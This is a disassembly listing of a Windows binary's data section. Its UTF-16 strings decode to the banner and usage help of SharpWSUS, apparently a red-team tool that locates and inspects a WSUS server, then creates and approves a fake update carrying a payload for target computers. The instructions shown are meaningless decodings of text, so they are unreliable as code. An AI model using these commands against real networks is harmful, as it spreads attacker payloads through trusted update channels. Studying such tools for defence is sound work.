  40c7ae:	00 20                	add    %ah,(%eax)
  40c7b0:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c7b4:	00 2e                	add    %ch,(%esi)
  40c7b6:	00 5f 00             	add    %bl,0x0(%edi)
  40c7b9:	5f                   	pop    %edi
  40c7ba:	00 2f                	add    %ch,(%edi)
  40c7bc:	00 20                	add    %ah,(%eax)
  40c7be:	00 5c 00 5f          	add    %bl,0x5f(%eax,%eax,1)
  40c7c2:	00 2f                	add    %ch,(%edi)
  40c7c4:	00 5c 00 5f          	add    %bl,0x5f(%eax,%eax,1)
  40c7c8:	00 2f                	add    %ch,(%edi)
  40c7ca:	00 20                	add    %ah,(%eax)
  40c7cc:	00 20                	add    %ah,(%eax)
  40c7ce:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c7d2:	00 5f 00             	add    %bl,0x0(%edi)
  40c7d5:	5f                   	pop    %edi
  40c7d6:	00 5f 00             	add    %bl,0x0(%edi)
  40c7d9:	2f                   	das
  40c7da:	00 20                	add    %ah,(%eax)
  40c7dc:	00 5c 00 5f          	add    %bl,0x5f(%eax,%eax,1)
  40c7e0:	00 5f 00             	add    %bl,0x0(%edi)
  40c7e3:	5f                   	pop    %edi
  40c7e4:	00 2f                	add    %ch,(%edi)
  40c7e6:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c7ea:	00 5f 00             	add    %bl,0x0(%edi)
  40c7ed:	5f                   	pop    %edi
  40c7ee:	00 5f 00             	add    %bl,0x0(%edi)
  40c7f1:	2f                   	das
  40c7f2:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40c7f8:	00 20                	add    %ah,(%eax)
  40c7fa:	00 20                	add    %ah,(%eax)
  40c7fc:	00 20                	add    %ah,(%eax)
  40c7fe:	00 20                	add    %ah,(%eax)
  40c800:	00 20                	add    %ah,(%eax)
  40c802:	00 20                	add    %ah,(%eax)
  40c804:	00 20                	add    %ah,(%eax)
  40c806:	00 20                	add    %ah,(%eax)
  40c808:	00 20                	add    %ah,(%eax)
  40c80a:	00 20                	add    %ah,(%eax)
  40c80c:	00 20                	add    %ah,(%eax)
  40c80e:	00 20                	add    %ah,(%eax)
  40c810:	00 20                	add    %ah,(%eax)
  40c812:	00 20                	add    %ah,(%eax)
  40c814:	00 20                	add    %ah,(%eax)
  40c816:	00 20                	add    %ah,(%eax)
  40c818:	00 20                	add    %ah,(%eax)
  40c81a:	00 20                	add    %ah,(%eax)
  40c81c:	00 20                	add    %ah,(%eax)
  40c81e:	00 20                	add    %ah,(%eax)
  40c820:	00 20                	add    %ah,(%eax)
  40c822:	00 20                	add    %ah,(%eax)
  40c824:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c828:	00 7c 00 0d          	add    %bh,0xd(%eax,%eax,1)
  40c82c:	00 0a                	add    %cl,(%edx)
  40c82e:	00 20                	add    %ah,(%eax)
  40c830:	00 20                	add    %ah,(%eax)
  40c832:	00 20                	add    %ah,(%eax)
  40c834:	00 20                	add    %ah,(%eax)
  40c836:	00 20                	add    %ah,(%eax)
  40c838:	00 20                	add    %ah,(%eax)
  40c83a:	00 20                	add    %ah,(%eax)
  40c83c:	00 20                	add    %ah,(%eax)
  40c83e:	00 20                	add    %ah,(%eax)
  40c840:	00 20                	add    %ah,(%eax)
  40c842:	00 20                	add    %ah,(%eax)
  40c844:	00 50 00             	add    %dl,0x0(%eax)
  40c847:	68 00 69 00 6c       	push   $0x6c006900
  40c84c:	00 20                	add    %ah,(%eax)
  40c84e:	00 4b 00             	add    %cl,0x0(%ebx)
  40c851:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40c855:	62 00                	bound  %eax,(%eax)
  40c857:	6c                   	insb   (%dx),%es:(%edi)
  40c858:	00 65 00             	add    %ah,0x0(%ebp)
  40c85b:	20 00                	and    %al,(%eax)
  40c85d:	40                   	inc    %eax
  40c85e:	00 20                	add    %ah,(%eax)
  40c860:	00 4e 00             	add    %cl,0x0(%esi)
  40c863:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  40c868:	00 69 00             	add    %ch,0x0(%ecx)
  40c86b:	74 00                	je     0x40c86d
  40c86d:	75 00                	jne    0x40c86f
  40c86f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40c873:	20 00                	and    %al,(%eax)
  40c875:	52                   	push   %edx
  40c876:	00 65 00             	add    %ah,0x0(%ebp)
  40c879:	64 00 20             	add    %ah,%fs:(%eax)
  40c87c:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40c880:	00 61 00             	add    %ah,0x0(%ecx)
  40c883:	6d                   	insl   (%dx),%es:(%edi)
  40c884:	00 0d 00 0a 00 01    	add    %cl,0x1000a00
  40c88a:	8c ed                	mov    %gs,%ebp
  40c88c:	0d 00 0a 00 43       	or     $0x43000a00,%eax
  40c891:	00 6f 00             	add    %ch,0x0(%edi)
  40c894:	6d                   	insl   (%dx),%es:(%edi)
  40c895:	00 6d 00             	add    %ch,0x0(%ebp)
  40c898:	61                   	popa
  40c899:	00 6e 00             	add    %ch,0x0(%esi)
  40c89c:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40c8a0:	20 00                	and    %al,(%eax)
  40c8a2:	6c                   	insb   (%dx),%es:(%edi)
  40c8a3:	00 69 00             	add    %ch,0x0(%ecx)
  40c8a6:	73 00                	jae    0x40c8a8
  40c8a8:	74 00                	je     0x40c8aa
  40c8aa:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40c8af:	00 62 00             	add    %ah,0x0(%edx)
  40c8b2:	65 00 6c 00 6f       	add    %ch,%gs:0x6f(%eax,%eax,1)
  40c8b7:	00 77 00             	add    %dh,0x0(%edi)
  40c8ba:	20 00                	and    %al,(%eax)
  40c8bc:	68 00 61 00 76       	push   $0x76006100
  40c8c1:	00 65 00             	add    %ah,0x0(%ebp)
  40c8c4:	20 00                	and    %al,(%eax)
  40c8c6:	6f                   	outsl  %ds:(%esi),(%dx)
  40c8c7:	00 70 00             	add    %dh,0x0(%eax)
  40c8ca:	74 00                	je     0x40c8cc
  40c8cc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c8d2:	61                   	popa
  40c8d3:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c8d7:	00 70 00             	add    %dh,0x0(%eax)
  40c8da:	61                   	popa
  40c8db:	00 72 00             	add    %dh,0x0(%edx)
  40c8de:	61                   	popa
  40c8df:	00 6d 00             	add    %ch,0x0(%ebp)
  40c8e2:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  40c8e7:	00 72 00             	add    %dh,0x0(%edx)
  40c8ea:	73 00                	jae    0x40c8ec
  40c8ec:	20 00                	and    %al,(%eax)
  40c8ee:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  40c8f4:	3c 00                	cmp    $0x0,%al
  40c8f6:	3e 00 2e             	add    %ch,%ds:(%esi)
  40c8f9:	00 20                	add    %ah,(%eax)
  40c8fb:	00 0d 00 0a 00 0d    	add    %cl,0xd000a00
  40c901:	00 0a                	add    %cl,(%edx)
  40c903:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40c907:	00 63 00             	add    %ah,0x0(%ebx)
  40c90a:	61                   	popa
  40c90b:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c90f:	00 20                	add    %ah,(%eax)
  40c911:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40c915:	00 65 00             	add    %ah,0x0(%ebp)
  40c918:	20 00                	and    %al,(%eax)
  40c91a:	57                   	push   %edi
  40c91b:	00 53 00             	add    %dl,0x0(%ebx)
  40c91e:	55                   	push   %ebp
  40c91f:	00 53 00             	add    %dl,0x0(%ebx)
  40c922:	20 00                	and    %al,(%eax)
  40c924:	73 00                	jae    0x40c926
  40c926:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c92a:	76 00                	jbe    0x40c92c
  40c92c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c930:	3a 00                	cmp    (%eax),%al
  40c932:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40c937:	00 20                	add    %ah,(%eax)
  40c939:	00 20                	add    %ah,(%eax)
  40c93b:	00 20                	add    %ah,(%eax)
  40c93d:	00 53 00             	add    %dl,0x0(%ebx)
  40c940:	68 00 61 00 72       	push   $0x72006100
  40c945:	00 70 00             	add    %dh,0x0(%eax)
  40c948:	57                   	push   %edi
  40c949:	00 53 00             	add    %dl,0x0(%ebx)
  40c94c:	55                   	push   %ebp
  40c94d:	00 53 00             	add    %dl,0x0(%ebx)
  40c950:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40c954:	78 00                	js     0x40c956
  40c956:	65 00 20             	add    %ah,%gs:(%eax)
  40c959:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40c95d:	00 63 00             	add    %ah,0x0(%ebx)
  40c960:	61                   	popa
  40c961:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c965:	00 0d 00 0a 00 0d    	add    %cl,0xd000a00
  40c96b:	00 0a                	add    %cl,(%edx)
  40c96d:	00 49 00             	add    %cl,0x0(%ecx)
  40c970:	6e                   	outsb  %ds:(%esi),(%dx)
  40c971:	00 73 00             	add    %dh,0x0(%ebx)
  40c974:	70 00                	jo     0x40c976
  40c976:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c97a:	74 00                	je     0x40c97c
  40c97c:	20 00                	and    %al,(%eax)
  40c97e:	74 00                	je     0x40c980
  40c980:	68 00 65 00 20       	push   $0x20006500
  40c985:	00 57 00             	add    %dl,0x0(%edi)
  40c988:	53                   	push   %ebx
  40c989:	00 55 00             	add    %dl,0x0(%ebp)
  40c98c:	53                   	push   %ebx
  40c98d:	00 20                	add    %ah,(%eax)
  40c98f:	00 73 00             	add    %dh,0x0(%ebx)
  40c992:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c996:	76 00                	jbe    0x40c998
  40c998:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c99c:	2c 00                	sub    $0x0,%al
  40c99e:	20 00                	and    %al,(%eax)
  40c9a0:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40c9a4:	75 00                	jne    0x40c9a6
  40c9a6:	6d                   	insl   (%dx),%es:(%edi)
  40c9a7:	00 65 00             	add    %ah,0x0(%ebp)
  40c9aa:	72 00                	jb     0x40c9ac
  40c9ac:	61                   	popa
  40c9ad:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c9b1:	00 6e 00             	add    %ch,0x0(%esi)
  40c9b4:	67 00 20             	add    %ah,(%bx,%si)
  40c9b7:	00 63 00             	add    %ah,0x0(%ebx)
  40c9ba:	6c                   	insb   (%dx),%es:(%edi)
  40c9bb:	00 69 00             	add    %ch,0x0(%ecx)
  40c9be:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40c9c2:	74 00                	je     0x40c9c4
  40c9c4:	73 00                	jae    0x40c9c6
  40c9c6:	2c 00                	sub    $0x0,%al
  40c9c8:	20 00                	and    %al,(%eax)
  40c9ca:	73 00                	jae    0x40c9cc
  40c9cc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c9d0:	76 00                	jbe    0x40c9d2
  40c9d2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c9d6:	73 00                	jae    0x40c9d8
  40c9d8:	20 00                	and    %al,(%eax)
  40c9da:	61                   	popa
  40c9db:	00 6e 00             	add    %ch,0x0(%esi)
  40c9de:	64 00 20             	add    %ah,%fs:(%eax)
  40c9e1:	00 65 00             	add    %ah,0x0(%ebp)
  40c9e4:	78 00                	js     0x40c9e6
  40c9e6:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40c9ec:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c9f2:	20 00                	and    %al,(%eax)
  40c9f4:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40c9f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40c9f9:	00 75 00             	add    %dh,0x0(%ebp)
  40c9fc:	70 00                	jo     0x40c9fe
  40c9fe:	73 00                	jae    0x40ca00
  40ca00:	3a 00                	cmp    (%eax),%al
  40ca02:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40ca07:	00 20                	add    %ah,(%eax)
  40ca09:	00 20                	add    %ah,(%eax)
  40ca0b:	00 20                	add    %ah,(%eax)
  40ca0d:	00 53 00             	add    %dl,0x0(%ebx)
  40ca10:	68 00 61 00 72       	push   $0x72006100
  40ca15:	00 70 00             	add    %dh,0x0(%eax)
  40ca18:	57                   	push   %edi
  40ca19:	00 53 00             	add    %dl,0x0(%ebx)
  40ca1c:	55                   	push   %ebp
  40ca1d:	00 53 00             	add    %dl,0x0(%ebx)
  40ca20:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40ca24:	78 00                	js     0x40ca26
  40ca26:	65 00 20             	add    %ah,%gs:(%eax)
  40ca29:	00 69 00             	add    %ch,0x0(%ecx)
  40ca2c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ca2d:	00 73 00             	add    %dh,0x0(%ebx)
  40ca30:	70 00                	jo     0x40ca32
  40ca32:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ca36:	74 00                	je     0x40ca38
  40ca38:	20 00                	and    %al,(%eax)
  40ca3a:	0d 00 0a 00 0d       	or     $0xd000a00,%eax
  40ca3f:	00 0a                	add    %cl,(%edx)
  40ca41:	00 43 00             	add    %al,0x0(%ebx)
  40ca44:	72 00                	jb     0x40ca46
  40ca46:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40ca4a:	74 00                	je     0x40ca4c
  40ca4c:	65 00 20             	add    %ah,%gs:(%eax)
  40ca4f:	00 61 00             	add    %ah,0x0(%ecx)
  40ca52:	6e                   	outsb  %ds:(%esi),(%dx)
  40ca53:	00 20                	add    %ah,(%eax)
  40ca55:	00 75 00             	add    %dh,0x0(%ebp)
  40ca58:	70 00                	jo     0x40ca5a
  40ca5a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ca5e:	74 00                	je     0x40ca60
  40ca60:	65 00 20             	add    %ah,%gs:(%eax)
  40ca63:	00 28                	add    %ch,(%eax)
  40ca65:	00 4e 00             	add    %cl,0x0(%esi)
  40ca68:	4f                   	dec    %edi
  40ca69:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40ca6d:	00 3a                	add    %bh,(%edx)
  40ca6f:	00 20                	add    %ah,(%eax)
  40ca71:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40ca75:	00 65 00             	add    %ah,0x0(%ebp)
  40ca78:	20 00                	and    %al,(%eax)
  40ca7a:	70 00                	jo     0x40ca7c
  40ca7c:	61                   	popa
  40ca7d:	00 79 00             	add    %bh,0x0(%ecx)
  40ca80:	6c                   	insb   (%dx),%es:(%edi)
  40ca81:	00 6f 00             	add    %ch,0x0(%edi)
  40ca84:	61                   	popa
  40ca85:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40ca89:	00 68 00             	add    %ch,0x0(%eax)
  40ca8c:	61                   	popa
  40ca8d:	00 73 00             	add    %dh,0x0(%ebx)
  40ca90:	20 00                	and    %al,(%eax)
  40ca92:	74 00                	je     0x40ca94
  40ca94:	6f                   	outsl  %ds:(%esi),(%dx)
  40ca95:	00 20                	add    %ah,(%eax)
  40ca97:	00 62 00             	add    %ah,0x0(%edx)
  40ca9a:	65 00 20             	add    %ah,%gs:(%eax)
  40ca9d:	00 61 00             	add    %ah,0x0(%ecx)
  40caa0:	20 00                	and    %al,(%eax)
  40caa2:	77 00                	ja     0x40caa4
  40caa4:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40caaa:	6f                   	outsl  %ds:(%esi),(%dx)
  40caab:	00 77 00             	add    %dh,0x0(%edi)
  40caae:	73 00                	jae    0x40cab0
  40cab0:	20 00                	and    %al,(%eax)
  40cab2:	73 00                	jae    0x40cab4
  40cab4:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  40caba:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40cabf:	00 62 00             	add    %ah,0x0(%edx)
  40cac2:	69 00 6e 00 61 00    	imul   $0x61006e,(%eax),%eax
  40cac8:	72 00                	jb     0x40caca
  40caca:	79 00                	jns    0x40cacc
  40cacc:	29 00                	sub    %eax,(%eax)
  40cace:	3a 00                	cmp    (%eax),%al
  40cad0:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40cad5:	00 20                	add    %ah,(%eax)
  40cad7:	00 20                	add    %ah,(%eax)
  40cad9:	00 20                	add    %ah,(%eax)
  40cadb:	00 53 00             	add    %dl,0x0(%ebx)
  40cade:	68 00 61 00 72       	push   $0x72006100
  40cae3:	00 70 00             	add    %dh,0x0(%eax)
  40cae6:	57                   	push   %edi
  40cae7:	00 53 00             	add    %dl,0x0(%ebx)
  40caea:	55                   	push   %ebp
  40caeb:	00 53 00             	add    %dl,0x0(%ebx)
  40caee:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40caf2:	78 00                	js     0x40caf4
  40caf4:	65 00 20             	add    %ah,%gs:(%eax)
  40caf7:	00 63 00             	add    %ah,0x0(%ebx)
  40cafa:	72 00                	jb     0x40cafc
  40cafc:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40cb00:	74 00                	je     0x40cb02
  40cb02:	65 00 20             	add    %ah,%gs:(%eax)
  40cb05:	00 2f                	add    %ch,(%edi)
  40cb07:	00 70 00             	add    %dh,0x0(%eax)
  40cb0a:	61                   	popa
  40cb0b:	00 79 00             	add    %bh,0x0(%ecx)
  40cb0e:	6c                   	insb   (%dx),%es:(%edi)
  40cb0f:	00 6f 00             	add    %ch,0x0(%edi)
  40cb12:	61                   	popa
  40cb13:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40cb17:	00 5b 00             	add    %bl,0x0(%ebx)
  40cb1a:	46                   	inc    %esi
  40cb1b:	00 69 00             	add    %ch,0x0(%ecx)
  40cb1e:	6c                   	insb   (%dx),%es:(%edi)
  40cb1f:	00 65 00             	add    %ah,0x0(%ebp)
  40cb22:	20 00                	and    %al,(%eax)
  40cb24:	6c                   	insb   (%dx),%es:(%edi)
  40cb25:	00 6f 00             	add    %ch,0x0(%edi)
  40cb28:	63 00                	arpl   %eax,(%eax)
  40cb2a:	61                   	popa
  40cb2b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40cb2f:	00 6f 00             	add    %ch,0x0(%edi)
  40cb32:	6e                   	outsb  %ds:(%esi),(%dx)
  40cb33:	00 5d 00             	add    %bl,0x0(%ebp)
  40cb36:	20 00                	and    %al,(%eax)
  40cb38:	2f                   	das
  40cb39:	00 61 00             	add    %ah,0x0(%ecx)
  40cb3c:	72 00                	jb     0x40cb3e
  40cb3e:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40cb42:	3a 00                	cmp    (%eax),%al
  40cb44:	5b                   	pop    %ebx
  40cb45:	00 41 00             	add    %al,0x0(%ecx)
  40cb48:	72 00                	jb     0x40cb4a
  40cb4a:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40cb4e:	20 00                	and    %al,(%eax)
  40cb50:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40cb54:	72 00                	jb     0x40cb56
  40cb56:	20 00                	and    %al,(%eax)
  40cb58:	70 00                	jo     0x40cb5a
  40cb5a:	61                   	popa
  40cb5b:	00 79 00             	add    %bh,0x0(%ecx)
  40cb5e:	6c                   	insb   (%dx),%es:(%edi)
  40cb5f:	00 6f 00             	add    %ch,0x0(%edi)
  40cb62:	61                   	popa
  40cb63:	00 64 00 5d          	add    %ah,0x5d(%eax,%eax,1)
  40cb67:	00 20                	add    %ah,(%eax)
  40cb69:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40cb6c:	2f                   	das
  40cb6d:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40cb71:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40cb75:	00 65 00             	add    %ah,0x0(%ebp)
  40cb78:	3a 00                	cmp    (%eax),%al
  40cb7a:	5b                   	pop    %ebx
  40cb7b:	00 55 00             	add    %dl,0x0(%ebp)
  40cb7e:	70 00                	jo     0x40cb80
  40cb80:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cb84:	74 00                	je     0x40cb86
  40cb86:	65 00 20             	add    %ah,%gs:(%eax)
  40cb89:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40cb8d:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40cb91:	00 65 00             	add    %ah,0x0(%ebp)
  40cb94:	5d                   	pop    %ebp
  40cb95:	00 20                	add    %ah,(%eax)
  40cb97:	00 2f                	add    %ch,(%edi)
  40cb99:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40cb9d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40cba1:	00 3a                	add    %bh,(%edx)
  40cba3:	00 5b 00             	add    %bl,0x0(%ebx)
  40cba6:	59                   	pop    %ecx
  40cba7:	00 59 00             	add    %bl,0x0(%ecx)
  40cbaa:	59                   	pop    %ecx
  40cbab:	00 59 00             	add    %bl,0x0(%ecx)
  40cbae:	2d 00 4d 00 4d       	sub    $0x4d004d00,%eax
  40cbb3:	00 2d 00 44 00 44    	add    %ch,0x44004400
  40cbb9:	00 5d 00             	add    %bl,0x0(%ebp)
  40cbbc:	20 00                	and    %al,(%eax)
  40cbbe:	2f                   	das
  40cbbf:	00 6b 00             	add    %ch,0x0(%ebx)
  40cbc2:	62 00                	bound  %eax,(%eax)
  40cbc4:	3a 00                	cmp    (%eax),%al
  40cbc6:	5b                   	pop    %ebx
  40cbc7:	00 4b 00             	add    %cl,0x0(%ebx)
  40cbca:	42                   	inc    %edx
  40cbcb:	00 20                	add    %ah,(%eax)
  40cbcd:	00 6f 00             	add    %ch,0x0(%edi)
  40cbd0:	6e                   	outsb  %ds:(%esi),(%dx)
  40cbd1:	00 20                	add    %ah,(%eax)
  40cbd3:	00 75 00             	add    %dh,0x0(%ebp)
  40cbd6:	70 00                	jo     0x40cbd8
  40cbd8:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cbdc:	74 00                	je     0x40cbde
  40cbde:	65 00 5d 00          	add    %bl,%gs:0x0(%ebp)
  40cbe2:	20 00                	and    %al,(%eax)
  40cbe4:	2f                   	das
  40cbe5:	00 72 00             	add    %dh,0x0(%edx)
  40cbe8:	61                   	popa
  40cbe9:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40cbed:	00 6e 00             	add    %ch,0x0(%esi)
  40cbf0:	67 00 3a             	add    %bh,(%bp,%si)
  40cbf3:	00 5b 00             	add    %bl,0x0(%ebx)
  40cbf6:	52                   	push   %edx
  40cbf7:	00 61 00             	add    %ah,0x0(%ecx)
  40cbfa:	74 00                	je     0x40cbfc
  40cbfc:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40cc02:	20 00                	and    %al,(%eax)
  40cc04:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc05:	00 66 00             	add    %ah,0x0(%esi)
  40cc08:	20 00                	and    %al,(%eax)
  40cc0a:	75 00                	jne    0x40cc0c
  40cc0c:	70 00                	jo     0x40cc0e
  40cc0e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cc12:	74 00                	je     0x40cc14
  40cc14:	65 00 5d 00          	add    %bl,%gs:0x0(%ebp)
  40cc18:	20 00                	and    %al,(%eax)
  40cc1a:	2f                   	das
  40cc1b:	00 6d 00             	add    %ch,0x0(%ebp)
  40cc1e:	73 00                	jae    0x40cc20
  40cc20:	72 00                	jb     0x40cc22
  40cc22:	63 00                	arpl   %eax,(%eax)
  40cc24:	3a 00                	cmp    (%eax),%al
  40cc26:	5b                   	pop    %ebx
  40cc27:	00 4d 00             	add    %cl,0x0(%ebp)
  40cc2a:	53                   	push   %ebx
  40cc2b:	00 52 00             	add    %dl,0x0(%edx)
  40cc2e:	43                   	inc    %ebx
  40cc2f:	00 5d 00             	add    %bl,0x0(%ebp)
  40cc32:	20 00                	and    %al,(%eax)
  40cc34:	2f                   	das
  40cc35:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40cc39:	00 73 00             	add    %dh,0x0(%ebx)
  40cc3c:	63 00                	arpl   %eax,(%eax)
  40cc3e:	72 00                	jb     0x40cc40
  40cc40:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40cc46:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40cc4c:	3a 00                	cmp    (%eax),%al
  40cc4e:	5b                   	pop    %ebx
  40cc4f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40cc53:	00 73 00             	add    %dh,0x0(%ebx)
  40cc56:	63 00                	arpl   %eax,(%eax)
  40cc58:	72 00                	jb     0x40cc5a
  40cc5a:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40cc60:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40cc66:	5d                   	pop    %ebp
  40cc67:	00 20                	add    %ah,(%eax)
  40cc69:	00 2f                	add    %ch,(%edi)
  40cc6b:	00 75 00             	add    %dh,0x0(%ebp)
  40cc6e:	72 00                	jb     0x40cc70
  40cc70:	6c                   	insb   (%dx),%es:(%edi)
  40cc71:	00 3a                	add    %bh,(%edx)
  40cc73:	00 5b 00             	add    %bl,0x0(%ebx)
  40cc76:	75 00                	jne    0x40cc78
  40cc78:	72 00                	jb     0x40cc7a
  40cc7a:	6c                   	insb   (%dx),%es:(%edi)
  40cc7b:	00 5d 00             	add    %bl,0x0(%ebp)
  40cc7e:	3e 00 0d 00 0a 00 0d 	add    %cl,%ds:0xd000a00
  40cc85:	00 0a                	add    %cl,(%edx)
  40cc87:	00 41 00             	add    %al,0x0(%ecx)
  40cc8a:	70 00                	jo     0x40cc8c
  40cc8c:	70 00                	jo     0x40cc8e
  40cc8e:	72 00                	jb     0x40cc90
  40cc90:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc91:	00 76 00             	add    %dh,0x0(%esi)
  40cc94:	65 00 20             	add    %ah,%gs:(%eax)
  40cc97:	00 61 00             	add    %ah,0x0(%ecx)
  40cc9a:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc9b:	00 20                	add    %ah,(%eax)
  40cc9d:	00 75 00             	add    %dh,0x0(%ebp)
  40cca0:	70 00                	jo     0x40cca2
  40cca2:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cca6:	74 00                	je     0x40cca8
  40cca8:	65 00 3a             	add    %bh,%gs:(%edx)
  40ccab:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40ccb1:	00 20                	add    %ah,(%eax)
  40ccb3:	00 20                	add    %ah,(%eax)
  40ccb5:	00 20                	add    %ah,(%eax)
  40ccb7:	00 53 00             	add    %dl,0x0(%ebx)
  40ccba:	68 00 61 00 72       	push   $0x72006100
  40ccbf:	00 70 00             	add    %dh,0x0(%eax)
  40ccc2:	57                   	push   %edi
  40ccc3:	00 53 00             	add    %dl,0x0(%ebx)
  40ccc6:	55                   	push   %ebp
  40ccc7:	00 53 00             	add    %dl,0x0(%ebx)
  40ccca:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40ccce:	78 00                	js     0x40ccd0
  40ccd0:	65 00 20             	add    %ah,%gs:(%eax)
  40ccd3:	00 61 00             	add    %ah,0x0(%ecx)
  40ccd6:	70 00                	jo     0x40ccd8
  40ccd8:	70 00                	jo     0x40ccda
  40ccda:	72 00                	jb     0x40ccdc
  40ccdc:	6f                   	outsl  %ds:(%esi),(%dx)
  40ccdd:	00 76 00             	add    %dh,0x0(%esi)
  40cce0:	65 00 20             	add    %ah,%gs:(%eax)
  40cce3:	00 2f                	add    %ch,(%edi)
  40cce5:	00 75 00             	add    %dh,0x0(%ebp)
  40cce8:	70 00                	jo     0x40ccea
  40ccea:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ccee:	74 00                	je     0x40ccf0
  40ccf0:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40ccf4:	64 00 3a             	add    %bh,%fs:(%edx)
  40ccf7:	00 5b 00             	add    %bl,0x0(%ebx)
  40ccfa:	55                   	push   %ebp
  40ccfb:	00 70 00             	add    %dh,0x0(%eax)
  40ccfe:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40cd02:	74 00                	je     0x40cd04
  40cd04:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40cd08:	55                   	push   %ebp
  40cd09:	00 49 00             	add    %cl,0x0(%ecx)
  40cd0c:	44                   	inc    %esp
  40cd0d:	00 5d 00             	add    %bl,0x0(%ebp)
  40cd10:	20 00                	and    %al,(%eax)
  40cd12:	2f                   	das
  40cd13:	00 63 00             	add    %ah,0x0(%ebx)
  40cd16:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd17:	00 6d 00             	add    %ch,0x0(%ebp)
  40cd1a:	70 00                	jo     0x40cd1c
  40cd1c:	75 00                	jne    0x40cd1e
  40cd1e:	74 00                	je     0x40cd20
  40cd20:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40cd24:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd25:	00 61 00             	add    %ah,0x0(%ecx)
  40cd28:	6d                   	insl   (%dx),%es:(%edi)
  40cd29:	00 65 00             	add    %ah,0x0(%ebp)
  40cd2c:	3a 00                	cmp    (%eax),%al
